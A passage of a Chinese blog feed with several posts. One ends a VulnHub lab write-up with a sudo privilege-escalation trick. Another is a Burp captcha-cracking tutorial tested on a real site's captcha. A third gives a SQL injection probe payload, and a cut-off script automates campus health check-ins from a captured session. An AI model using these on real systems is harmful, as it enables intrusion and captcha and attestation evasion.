id="x2F-bin-x2F-bash提权"><a href="#x2F-bin-x2F-bash提权" class="headerlink" title="&#x2F;bin&#x2F;bash提权"></a>&#x2F;bin&#x2F;bash提权</h2><ul><li>接下来的思路就是创建<code>challenge</code>文件，将<code>/bin/bash</code>写入文件中，然后重新执行<code>sudo /home/victor/undefeated_victor</code>命令以<strong>获取root权限的shell</strong>.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; challenge</span><br><span class="line">chmod +x challenge</span><br><span class="line">sudo /home/victor/undefeated_victor</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221105170834360.png" alt="image-20221105170834360"></p><p>可以看到，此时已经&#x3D;&#x3D;成功拿到root权限&#x3D;&#x3D;</p><h1 id="拿flag"><a href="#拿flag" class="headerlink" title="拿flag"></a>拿flag</h1><ul><li>切换到&#x2F;root,查看</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221105171431456.png" alt="image-20221105171431456"></p><ul><li>查看<code>root.txt</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat root.txt</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221105171456711.png" alt="image-20221105171456711"></p><p>完结撒花~~~终于拿到了flag</p><h1 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h1><h2 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h2><ul><li><p>使用nmap扫描的时候，用的是最简单的命令，扫描显示出来的信息比较单一</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sTVC ... &gt; xxx.txt</span><br></pre></td></tr></table></figure><p>导出到文件里，到时候找起来更方便，不要每次都在终端翻来翻去</p></li><li><p>对Kali内的工具不熟悉，到某个特定的步骤之后，知道要干啥，但不知道具体要怎么做，有什么工具可以使用。如果只下载了，又不去用它，那为什么要下载呢？单纯为了好看吗？</p><blockquote><p>后续花时间专门整理一下Kali的工具，输出一个文档</p></blockquote></li></ul><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>初次解除了完整的一套渗透测试流程，从查找IP到拿到Root权限，从Web打到shell再到提权</li><li>wordpress的主题模块可以执行命令</li><li>反弹shell初体验</li><li>更加熟悉linux的一些命令，比如<code>sudo -l</code>等</li><li>msf可用用background命令把meterpreter退到后台</li></ul><h2 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h2><ul><li>最后AES解密：为什么是AES？那些参数是这么选的，问了大佬，说是密码学的知识！补！！！</li><li>写入<code>/bin/bash</code>提权，不懂！看！！！</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp验证码爆破captcha-killer+ddddocr</title>
      <link href="/burpsuite-captcha-killer-and-ddddocr/"/>
      <url>/burpsuite-captcha-killer-and-ddddocr/</url>
      
        <content type="html"><![CDATA[<h1 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><ul><li><a href="https://github.com/f0ng/captcha-killer-modified/releases/">Releases · f0ng&#x2F;captcha-killer-modified</a></li></ul><p>​最新版的Burp插件（根据自己的jdk版本来选择）</p><img src="/img/202211021704736.png" alt="image-20221102155830776" style="zoom:50%;" /><ul><li><a href="https://github.com/f0ng/captcha-killer-modified/tree/0.16">f0ng&#x2F;captcha-killer-modified at 0.16</a></li></ul><p>​把<code>codereg.py</code>给down下来（你可以选择直接下zip包，或者直接复制）</p><img src="/img/202211021704971.png" alt="image-20221102160044024" style="zoom:50%;" /><ul><li>安装ddddocr所需要的python库</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install ddddocr aiohttp</span><br></pre></td></tr></table></figure><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Burp安装插件</p><p><img src="/img/202211021704397.png" alt="image-20221102160634476"></p><h1 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h1><h2 id="测试接口"><a href="#测试接口" class="headerlink" title="测试接口"></a>测试接口</h2><p>1、首先得找个验证码接口，不然咋测试？</p><p>​我这里随便上网找了个网站的<a href="http://passport.youmi.cn/include/showcaptcha/?w=62&h=24&s=12&x=0.7366157956335038&mobile=">验证码接口</a></p><p>​你可以自己找，也可以直接用我上面找的那个</p><p>2、访问上面的接口，bp抓包，发送到repeater模块（因为没有找到可以直接发到captcha-killer模块的选项）</p><img src="/img/202211021705301.png" alt="image-20221102164204151" style="zoom:50%;" /><p>3、发送到captcha-killer</p><p>​选send to captcha panel哈！！</p><p>​下面的interface panel是识别模块用的（这里也就是ddddocr）</p><img src="/img/202211021705424.png" alt="image-20221102164341238" style="zoom:50%;" /><p>4、点击【获取】，看后面的验证码也没有变化，有变化的话，测试接口这一部分就没问题啦</p><img src="/img/202211021705259.png" alt="image-20221102164611408" style="zoom:50%;" /><p>接下来就开始配置ddddocr模块去识别</p><h2 id="ddddocr配置"><a href="#ddddocr配置" class="headerlink" title="ddddocr配置"></a>ddddocr配置</h2><p>刚刚下的<code>codereg.py</code>还记得么？pip包装好了就可以开始下面的步骤了。</p><p>1、用你的python3去运行它</p><p>​因为我电脑有两个版本的python，环境变量区分了python2和python3，你可以根据你自己电脑的配置来运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 codereg.py</span><br></pre></td></tr></table></figure><p>确定该服务已经起来了</p><p><img src="/img/202211021705519.png" alt="image-20221102165131315"></p><p>2、配置interface</p><p>​我换了4130端口，你那边填多少端口以你上面跑python脚本的时候输出的端口</p><img src="/img/202211021705686.png" alt="image-20221102165229831" style="zoom:50%;" /><p>request的内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /reg HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:4130</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 55</span><br><span class="line"></span><br><span class="line">&lt;@BASE64&gt;&lt;@img_RAW&gt;&lt;@img_RAW&gt;&lt;@BASE64&gt;</span><br></pre></td></tr></table></figure><p>激动人心的时候到啦！</p><p>3、点【识别】</p><img src="/img/202211021705281.png" alt="image-20221102165526579" style="zoom:50%;" /><p>欸~~这就可以啦</p><p>匹配方式选择Response data就好</p><p>如果返回 <strong>空白</strong>或者<strong>403Forbidden</strong>，参考以下方法</p><h1 id="返回空白"><a href="#返回空白" class="headerlink" title="返回空白"></a>返回空白</h1><p>接口的request填错了会这样，我遇到过，直接复制上面的模板就好</p><h1 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h1><p>打开<code>codereg.py</code></p><p>把下面这两句引起403报错的语句注释掉就好</p><img src="/img/202211021705894.png" alt="image-20221102165756410" style="zoom:50%;" /><p>接着Ctrl+C停止之前的脚本，重新运行一遍脚本，就可以啦</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo简明教程</title>
      <link href="/hexo-tutorial/"/>
      <url>/hexo-tutorial/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是-Hexo？"><a href="#什么是-Hexo？" class="headerlink" title="什么是 Hexo？"></a>什么是 Hexo？</h1><p>Hexo 是一个基于 node.js 快速、简洁且高效的博客框架。支持 Markdown 写作，可一键部署到 <a href="https://github.com/">GitHub</a>平台。Hexo 还有丰富的主题和插件可供定制和扩展，可以瞬间拥有个人专属的博客网站。</p><h1 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h1><blockquote><p>本篇博客不提供安装教程（emmmm就是我太懒了），请自行搜索</p></blockquote><ul><li><p>node.js（不低于10.13，建议使用12.0及以上版本）</p><p>Hexo基于node.js</p></li><li><p>npm</p><p>node.js的包管理工具</p></li></ul><p>查看电脑是否安装了环境</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看node.js版本</span></span><br><span class="line">node <span class="literal">-v</span></span><br><span class="line"><span class="comment"># 查看npm版本</span></span><br><span class="line">npm <span class="literal">-v</span></span><br></pre></td></tr></table></figure><p>有版本输出就代表环境安装好了</p><p>那我们就正式开始Hexo之路吧~</p><h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install <span class="literal">-g</span> hexo<span class="literal">-cli</span></span><br></pre></td></tr></table></figure><p>-g 代表全局安装（不必太过纠结这个哈~熟悉前端和node的朋友可以直接<code>npm install hexo-cli</code>）</p><p>好啦！到这里，Hexo已经安装好啦 ~</p><h1 id="Hexo操作"><a href="#Hexo操作" class="headerlink" title="Hexo操作"></a>Hexo操作</h1><p>下面是Hexo的一些操作指南，助你快速入门Hexo</p><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>这里讲两种方式哈，效果都一样，随便选个就行</p><p><strong>方法一</strong></p><ol><li>新建一个文件夹</li><li>cmd切换到该路径，输入<code>hexo init</code></li></ol><p><strong>方法二</strong></p><p><code>hexo init [name]</code></p><p>name是文件夹名字，相当于省去了方法一的第一步</p><h2 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h2><p>经过上一步的初始化操作，你的Hexo博客已经搭建起来啦</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g <span class="comment"># 生成</span></span><br><span class="line">hexo s <span class="comment"># 本地启动服务</span></span><br></pre></td></tr></table></figure><p>这时候，终端会开启一个服务，一般是<a href="http://localhost:4000/">http://localhost:4000</a>，按住Ctrl单击就可以打开</p><p>这时候你就可以看到一个Hexo博客啦~</p><p><em>如果无法显示，可能是 4000 端口被占用了，可以使用如下命令指定端口</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s -p 4444 <span class="comment"># 指定4444端口或者其他端口</span></span><br></pre></td></tr></table></figure><p>如果经常4000端口被占用，建议一劳永逸，直接修改配置文件<em>node_modules&#x2F;hexo-server&#x2F;index.js</em>，将默认端口改成4444或者其他端口</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hexo.<span class="property">config</span>.<span class="property">server</span> = <span class="title function_">assign</span>(&#123;</span><br><span class="line">  <span class="comment">//将默认端口改成4444</span></span><br><span class="line">  <span class="attr">port</span>: <span class="number">4444</span>,</span><br><span class="line">  <span class="attr">log</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">ip</span>: <span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">  <span class="attr">compress</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">header</span>: <span class="literal">true</span></span><br><span class="line">&#125;, hexo.<span class="property">config</span>.<span class="property">server</span>);</span><br></pre></td></tr></table></figure><p>如果你的github也配置好了，那么输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d <span class="comment"># 部署</span></span><br></pre></td></tr></table></figure><p>就可以把本地的博客部署到GitHub Pages上啦</p><h2 id="新建博客"><a href="#新建博客" class="headerlink" title="新建博客"></a>新建博客</h2><ol><li>新建一个文章</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo n <span class="string">&quot;postName&quot;</span><span class="comment"># 新建文章,postName未文章名</span></span><br><span class="line"><span class="comment"># or 不使用简写</span></span><br><span class="line">hexo new <span class="string">&quot;postName&quot;</span><span class="comment"># 新建文章,postName未文章名</span></span><br></pre></td></tr></table></figure><ol start="2"><li>打开博客目录下的&#x2F;source&#x2F;_posts就可以看到刚刚新建的md文件啦</li><li>编辑md文件，保存</li><li>生成并本地预览</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hexo s <span class="literal">-g</span> <span class="comment"># 组合命令，生成并本地预览</span></span><br><span class="line"><span class="comment"># or 分开输入两条命令</span></span><br><span class="line">hexo g<span class="comment"># 生成（缩写）</span></span><br><span class="line">hexo s<span class="comment"># 预览（缩写）</span></span><br><span class="line"><span class="comment"># or 分开并不使用简写</span></span><br><span class="line">hexo generate<span class="comment"># 生成</span></span><br><span class="line">hexo server <span class="comment"># 预览</span></span><br></pre></td></tr></table></figure><h2 id="设置标头"><a href="#设置标头" class="headerlink" title="设置标头"></a>设置标头</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">我是文章名</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2018-08-13 09:22:18</span></span><br><span class="line"><span class="comment"># 标签</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">blog</span></span><br><span class="line"><span class="comment"># 分类</span></span><br><span class="line"><span class="attr">categories:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tutorial</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown</span></span><br></pre></td></tr></table></figure><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><p>在 _config.yml 开启资源文件夹</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure><p>开启之后，在 _posts 目录下会生成一个与文章同名的文件夹。把需要插入到文章中的图片放到该文件夹中，并在写文章时通过如下标签引用即可。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_img &lt;图片名&gt; [图片标题] %&#125;</span><br></pre></td></tr></table></figure><h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><p>默认主题太丑了？那换个好看滴主题叭~~</p><p>直接去官网看看，找到喜欢的换就行，一般主题的开发者会写好怎么更换的哈~（emmm是我懒）</p><p>换好了之后，执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean<span class="comment"># 清除，避免更换失败</span></span><br><span class="line">hexo s <span class="literal">-g</span><span class="comment"># 生成，本地预览</span></span><br><span class="line"><span class="comment">## 预览没问题之后</span></span><br><span class="line">hexo d<span class="comment"># 部署</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最简单的方法：判断SQL注入是字符型还是数字型</title>
      <link href="/sqli-character-and-number-type-judgment/"/>
      <url>/sqli-character-and-number-type-judgment/</url>
      
        <content type="html"><![CDATA[<p>在网上看了那些方法，总的来说，我觉得有些绕。今天练习sqli-libs的时候自己遇到了问题，自己琢磨琢磨就想到了这些方法。</p><p>废话不多说，下面开始吧！</p><h1 id="方法一：order-by法"><a href="#方法一：order-by法" class="headerlink" title="方法一：order by法"></a>方法一：order by法</h1><p>构造payload为：<code>id=1 order by 9999 --+</code></p><ul><li>如果正确返回页面，则为字符型</li><li>否则，为数字型</li></ul><blockquote><p>分析：<br>字符型执行的sql语句为 <code>select * from user where id=&#39;1 order by 9999 --+&#39;</code> ,注释符【- -】实际上在执行的时候，被当成id的一部分，也就是说，在执行sql语句的时候，条件是 <code>id=&#39;1 order by 9999 --+&#39;</code>。最终只会截取前面的数字，返回 id&#x3D;1 的结果。<br>如果是数字型的话，执行的sql语句为 <code>select * from user where id=1 order by 9999 --+</code> ,在现实生活中，根本就没什么可能会存在有9999个字段的表，所以会报错。</p></blockquote><h1 id="方法二：逻辑判断法"><a href="#方法二：逻辑判断法" class="headerlink" title="方法二：逻辑判断法"></a>方法二：逻辑判断法</h1><p>这就很简单了，就是猜，但是也得知道一点技巧。</p><p>比如说，id这种，一般在数据库存储为int类型的，在查询时，可能是数字型，也可能是字符型。</p><p>但是，如果是name或者username之类的，按正常逻辑，一看就知道是以varchar或者char存储的，那指定就是字符型了，因为不加引号，sql语句绝对报错。</p><p>就像这样：</p><img src="/img/image-20230704122423046.png" alt="image-20230704122423046" style="zoom:50%;" /><p>如果不加引号，就会报错：</p><img src="/img/image-20230704122440609.png" alt="image-20230704122440609" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>易校园自动打卡教程</title>
      <link href="/yischool-auto-check-in/"/>
      <url>/yischool-auto-check-in/</url>
      
        <content type="html"><![CDATA[<p>之前在CSDN发了一篇易校园的打卡教程，后面易校园进行了改版，原来的脚本失效了，但是学校又天天催打卡，于是就有了这篇。</p><p>本来也是在CSDN上发的，但是因为某些原因审核不通过，也是因此我才产生了搭建个人博客的想法。</p><blockquote><p>2022.11.16</p><p>脚本仍然有用，使用几个月下来，唯一的不爽是session隔一段时间就会更换导致打卡失败，每次都得重新抓包替换上去，有些麻烦。</p><p>等有时间再看看获取session的接口可不可以找到，然后集成到代码里，就可以实现全自动化的打卡了！</p></blockquote><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>软件版本（请自行百度下载）</p><ul><li><p>HttpCanary：v9.9.9.9安卓版<br>可以用burpsuite，findler等其他的Windows抓包软件代替，自行搜索如何用电脑抓手机的包。</p></li><li><p>易校园：v4.1.17（下最新版就好）<br>上篇教程的时候，最新版抓包不行，这次又可以了</p></li></ul><h1 id="http-Canary配置"><a href="#http-Canary配置" class="headerlink" title="http Canary配置"></a>http Canary配置</h1><p>一般一打开就会提示安装证书，跟着app的引导，安装就好了，要是没有弹出，可以参考我之前的博客<br><a href="https://blog.csdn.net/jenchoi413/article/details/124786250">python实现易校园自动打卡教程</a>（已经被CSDN删了）</p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><p>1、完场上述准备工作 </p><p>2、进入易校园打卡界面，等待定位完成，划到底部【先不要提交】 </p><p>这样做是为了快速找到提交的包</p><p>3、此时打开HttpCanary，点击右下角的小飞机，开始抓包 </p><p>4、回到易校园，点击提交 </p><p>5、回到HttpCanary，再次点击右下角小飞机，停止抓包 </p><p>6、从下往上找出【POST <a href="https://h5.xiaofubao.com/marketing/health/doDetail%E3%80%91">https://h5.xiaofubao.com/marketing/health/doDetail】</a> </p><p>注意别找错了，一定是doDetail</p><p>7、找到之后点进去，点击请求包<br><img src="/img/a6f4985d333c4f51aafaf11f71204a7e.png" alt="img" style="zoom:67%;" /> </p><blockquote><p>嫌手动复制粘贴麻烦的话，推荐使用<strong>正则表达式</strong>把请求包转换成python字典的格式</p></blockquote><p>代码如下，修改填入你自己的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> yagmail</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendEmail</span>(<span class="params">email_to, email_title, email_content</span>):</span><br><span class="line">    <span class="comment"># 邮件用户</span></span><br><span class="line">    mail_user = <span class="string">&#x27;【你的QQ邮箱】&#x27;</span></span><br><span class="line">    <span class="comment"># 授权码</span></span><br><span class="line">    mail_key = <span class="string">&#x27;【授权码】&#x27;</span> <span class="comment"># 不会搞的自行百度qq邮箱授权码</span></span><br><span class="line">    <span class="comment"># smtp服务器</span></span><br><span class="line">    mail_host = <span class="string">&#x27;smtp.qq.com&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mail_server = yagmail.SMTP(</span><br><span class="line">            user=mail_user, password=mail_key, host=mail_host)</span><br><span class="line">        mail_server.send(email_to, email_title,</span><br><span class="line">                         email_content, attachments=<span class="literal">None</span>)</span><br><span class="line">        mail_server.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上面【raw】里的内容</span></span><br><span class="line">h = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;h5.xiaofubao.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;2051&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json, text/plain, */*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded;charset=UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;https://h5.xiaofubao.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上面【预览】里面的内容</span></span><br><span class="line">d = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;schoolCode&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;schoolName&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;identityType&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;userId&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mobilePhone&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jobNo&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;departmentCode&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;department&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;specialitiesCode&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;specialities&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;classCode&#x27;</span>: <span class="string">&#x27;【填你的】&#x27;</span>,</span><br><span class="line">    <span 